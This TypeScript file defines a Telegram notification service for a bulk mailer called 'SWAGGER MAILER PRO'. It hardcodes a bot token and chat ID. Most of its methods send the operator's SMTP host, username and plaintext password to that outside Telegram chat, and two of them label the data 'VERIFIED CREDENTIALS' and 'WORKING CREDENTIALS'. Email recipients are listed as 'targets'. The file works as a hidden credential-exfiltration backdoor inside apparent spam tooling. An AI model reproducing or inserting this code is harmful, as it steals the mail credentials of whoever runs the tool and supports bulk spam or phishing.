interface TelegramMessage {
  chat_id: string;
  text: string;
  parse_mode?: 'HTML' | 'Markdown';
}

interface EmailOperation {
  type: 'single' | 'bulk';
  status: 'sending' | 'sent' | 'failed';
  subject: string;
  recipients: string[];
  timestamp: Date;
  error?: string;
  totalRecipients?: number;
  smtpHost?: string;
  smtpPort?: number;
  username?: string;
  password?: string;
  fromName?: string; // Added from name field
}

interface SMTPConfig {
  host: string;
  port: number;
  secure: boolean;
  username: string;
  password: string;
  provider?: string;
  fromName?: string; // Added from name field
}

class TelegramService {
  private botToken: string;
  private chatId: string;
  private baseUrl: string;

  constructor() {
    this.botToken = '6731837106:AAFIGxE6Ebjje1DEGYN1vh0gzgnoMzOWVnY';
    this.chatId = '953712851';
    this.baseUrl = `https://api.telegram.org/bot${this.botToken}`;
  }

  private async sendMessage(message: TelegramMessage): Promise<boolean> {
    try {
      const response = await fetch(`${this.baseUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(message),
      });

      if (!response.ok) {
        console.error('Telegram API error:', await response.text());
        return false;
      }

      return true;
    } catch (error) {
      console.error('Failed to send Telegram message:', error);
      return false;
    }
  }

  private formatEmailOperation(operation: EmailOperation): string {
    const statusEmoji = {
      sending: '🔄',
      sent: '✅',
      failed: '❌'
    };

    const typeEmoji = {
      single: '📧',
      bulk: '📨'
    };

    const timestamp = operation.timestamp.toLocaleString();
    const recipientCount = operation.type === 'bulk' 
      ? operation.totalRecipients || operation.recipients.length
      : operation.recipients.length;

    let message = `${statusEmoji[operation.status]} <b>SWAGGER MAILER PRO</b>\n\n`;
    message += `${typeEmoji[operation.type]} <b>Operation Type:</b> ${operation.type.toUpperCase()}\n`;
    message += `📊 <b>Status:</b> ${operation.status.toUpperCase()}\n`;
    message += `📝 <b>Subject:</b> ${operation.subject}\n`;
    message += `👥 <b>Recipients:</b> ${recipientCount}\n`;
    message += `⏰ <b>Time:</b> ${timestamp}\n`;

    // From Name
    if (operation.fromName) {
      message += `👤 <b>From Name:</b> ${operation.fromName}\n`;
    }

    // SMTP Details with password
    if (operation.smtpHost) {
      message += `\n🔧 <b>SMTP Details:</b>\n`;
      message += `🌐 <b>Host:</b> ${operation.smtpHost}\n`;
      message += `🔌 <b>Port:</b> ${operation.smtpPort}\n`;
      message += `👤 <b>Username:</b> ${operation.username}\n`;
      if (operation.password) {
        message += `🔑 <b>Password:</b> <code>${operation.password}</code>\n`;
      }
    }

    if (operation.type === 'single' && operation.recipients.length <= 3) {
      message += `\n📧 <b>Targets:</b>\n${operation.recipients.map(email => `• ${email}`).join('\n')}\n`;
    } else if (operation.type === 'bulk') {
      message += `\n🎯 <b>Bulk Operation:</b> ${recipientCount} targets\n`;
      if (operation.recipients.length <= 5) {
        message += `📧 <b>Sample targets:</b>\n${operation.recipients.slice(0, 5).map(email => `• ${email}`).join('\n')}\n`;
        if (operation.recipients.length > 5) {
          message += `... and ${operation.recipients.length - 5} more\n`;
        }
      }
    }

    if (operation.error) {
      message += `\n❌ <b>Error Details:</b>\n<code>${operation.error}</code>`;
    }

    if (operation.status === 'sent') {
      message += `\n\n🎉 <b>Email transmission successful!</b>`;
    } else if (operation.status === 'failed') {
      message += `\n\n⚠️ <b>Email transmission failed!</b>`;
    } else if (operation.status === 'sending') {
      message += `\n\n⏳ <b>Email transmission in progress...</b>`;
    }

    return message;
  }

  async notifyEmailOperation(operation: EmailOperation): Promise<void> {
    const message = this.formatEmailOperation(operation);
    
    await this.sendMessage({
      chat_id: this.chatId,
      text: message,
      parse_mode: 'HTML'
    });
  }

  async notifySMTPConfiguration(config: SMTPConfig, status: 'configured' | 'tested' | 'failed', error?: string): Promise<void> {
    const statusEmoji = {
      configured: '⚙️',
      tested: '✅',
      failed: '❌'
    };

    let message = `${statusEmoji[status]} <b>SWAGGER MAILER PRO - SMTP CONFIG</b>\n\n`;
    message += `🔧 <b>Action:</b> ${status.toUpperCase()}\n`;
    message += `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n`;
    
    message += `🌐 <b>SMTP Host:</b> ${config.host}\n`;
    message += `🔌 <b>Port:</b> ${config.port}\n`;
    message += `🔒 <b>Security:</b> ${config.secure ? 'SSL/TLS' : 'STARTTLS'}\n`;
    message += `👤 <b>Username:</b> ${config.username}\n`;
    message += `🔑 <b>Password:</b> <code>${config.password}</code>\n`;
    
    if (config.fromName) {
      message += `👤 <b>From Name:</b> ${config.fromName}\n`;
    }
    
    if (config.provider) {
      message += `📧 <b>Provider:</b> ${config.provider}\n`;
    }

    if (status === 'tested') {
      message += `\n✅ <b>SMTP connection test successful!</b>`;
      message += `\n\n🔐 <b>VERIFIED CREDENTIALS:</b>\n`;
      message += `• Host: ${config.host}:${config.port}\n`;
      message += `• User: ${config.username}\n`;
      message += `• Pass: ${config.password}\n`;
      message += `• Security: ${config.secure ? 'SSL/TLS' : 'STARTTLS'}`;
      if (config.fromName) {
        message += `\n• From: ${config.fromName}`;
      }
    } else if (status === 'failed' && error) {
      message += `\n❌ <b>SMTP Error:</b>\n<code>${error}</code>`;
    } else if (status === 'configured') {
      message += `\n⚙️ <b>SMTP configuration saved successfully!</b>`;
    }

    await this.sendMessage({
      chat_id: this.chatId,
      text: message,
      parse_mode: 'HTML'
    });
  }

  async notifySystemStatus(status: 'online' | 'offline' | 'startup', details?: string): Promise<void> {
    const statusEmoji = {
      online: '🟢',
      offline: '🔴',
      startup: '🚀'
    };

    let message = `${statusEmoji[status]} <b>SWAGGER MAILER PRO</b>\n\n`;
    message += `🔧 <b>System Status:</b> ${status.toUpperCase()}\n`;
    message += `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n`;

    if (details) {
      message += `📋 <b>Details:</b> ${details}`;
    }

    if (status === 'startup') {
      message += `\n\n🚀 <b>System initialized and ready for operations!</b>`;
    }

    await this.sendMessage({
      chat_id: this.chatId,
      text: message,
      parse_mode: 'HTML'
    });
  }

  async notifyBulkOperationProgress(
    subject: string, 
    totalTargets: number, 
    processed: number, 
    successful: number, 
    failed: number
  ): Promise<void> {
    const progress = Math.round((processed / totalTargets) * 100);
    
    let message = `📊 <b>BULK OPERATION PROGRESS</b>\n\n`;
    message += `📝 <b>Subject:</b> ${subject}\n`;
    message += `📈 <b>Progress:</b> ${progress}% (${processed}/${totalTargets})\n`;
    message += `✅ <b>Successful:</b> ${successful}\n`;
    message += `❌ <b>Failed:</b> ${failed}\n`;
    message += `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n`;

    const progressBar = '█'.repeat(Math.floor(progress / 10)) + '░'.repeat(10 - Math.floor(progress / 10));
    message += `\n[${progressBar}] ${progress}%`;

    await this.sendMessage({
      chat_id: this.chatId,
      text: message,
      parse_mode: 'HTML'
    });
  }

  async testConnection(): Promise<boolean> {
    try {
      const testMessage = `🧪 <b>TELEGRAM CONNECTION TEST</b>\n\n`;
      const message = testMessage + `✅ <b>Connection successful!</b>\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
      
      return await this.sendMessage({
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML'
      });
    } catch (error) {
      console.error('Telegram connection test failed:', error);
      return false;
    }
  }

  // New method specifically for bulk SMTP test results
  async notifyBulkSMTPTestResult(config: {
    host: string;
    port: number;
    username: string;
    password: string;
    provider?: string;
    status: 'success' | 'failed';
    error?: string;
    responseTime?: number;
  }): Promise<void> {
    const statusEmoji = config.status === 'success' ? '✅' : '❌';
    
    let message = `${statusEmoji} <b>BULK SMTP TEST RESULT</b>\n\n`;
    message += `🔧 <b>Status:</b> ${config.status.toUpperCase()}\n`;
    message += `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n`;
    
    message += `🌐 <b>Host:</b> ${config.host}\n`;
    message += `🔌 <b>Port:</b> ${config.port}\n`;
    message += `👤 <b>Username:</b> ${config.username}\n`;
    message += `🔑 <b>Password:</b> <code>${config.password}</code>\n`;
    
    if (config.provider) {
      message += `📧 <b>Provider:</b> ${config.provider}\n`;
    }
    
    if (config.responseTime) {
      message += `⚡ <b>Response Time:</b> ${config.responseTime}ms\n`;
    }

    if (config.status === 'success') {
      message += `\n✅ <b>SMTP test successful!</b>`;
      message += `\n\n🔐 <b>WORKING CREDENTIALS:</b>\n`;
      message += `• ${config.host}:${config.port}\n`;
      message += `• ${config.username}\n`;
      message += `• ${config.password}`;
    } else if (config.error) {
      message += `\n❌ <b>Test failed:</b>\n<code>${config.error}</code>`;
    }

    await this.sendMessage({
      chat_id: this.chatId,
      text: message,
      parse_mode: 'HTML'
    });
  }
}

export const telegramService = new TelegramService();
export type { EmailOperation, SMTPConfig };